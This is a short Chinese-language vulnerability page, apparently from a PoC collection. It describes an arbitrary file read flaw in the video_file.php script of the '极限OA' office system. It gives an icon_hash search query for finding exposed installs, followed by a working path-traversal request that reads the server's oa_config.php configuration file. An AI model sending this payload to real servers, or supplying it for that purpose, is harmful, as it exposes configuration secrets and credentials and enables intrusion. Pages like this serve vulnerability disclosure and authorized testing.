# 极限OA video_file.php 任意文件读取漏洞

## 漏洞描述

极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

<a-checkbox checked>极限OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>icon_hash="1967132225"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1657611799572-0a7316e9-7d7d-4c8c-8e5c-891904bc474f-20220712154642026.png)

验证POC

```php
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
```

![img](../../../.vuepress/public/img/1657611948243-17fb2a06-755a-4e18-8e12-36aef770134c.png)